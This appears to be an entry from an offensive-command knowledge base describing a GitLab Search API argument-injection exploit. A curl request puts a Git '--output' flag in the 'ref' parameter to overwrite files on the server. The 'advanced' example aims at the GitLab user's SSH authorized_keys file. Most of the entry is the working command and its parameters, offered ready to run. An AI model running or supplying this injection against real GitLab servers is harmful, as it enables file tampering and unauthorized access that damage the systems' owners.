---
data: >-
  curl --header "PRIVATE-TOKEN: $TOKEN"
  'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
tags:
  - api
  - injection
type: command
executor: bash
platforms:
  - Linux
id: bd5125b5-0416-4c51-a32b-521ed35623d5
created_at: '2025-12-11T06:10:29.497Z'
updated_at: '2025-12-11T06:10:29.497Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-search-wiki-blobs

## Command

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

## Description

Makes an API call to GitLab's Search endpoint with wiki_blobs scope, injecting a Git flag via ref to overwrite a file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--header "PRIVATE-TOKEN: $TOKEN"` | Authentication token | Yes |
| `scope=wiki_blobs` | Search scope | Yes |
| `search=page` | Search term | Yes |
| `ref=--output=/tmp/file` | Injected flag | Yes |

## Examples

### Basic Usage

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

### Advanced Usage

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/var/opt/gitlab/.ssh/authorized_keys'
```

## Expected Output

API response JSON, triggers file overwrite with git log content.

## Related

- [[procedures/Inject-Git-Flag-via-Search-API]]
- [[procedures/Overwrite-Authorized-Keys-via-API]]
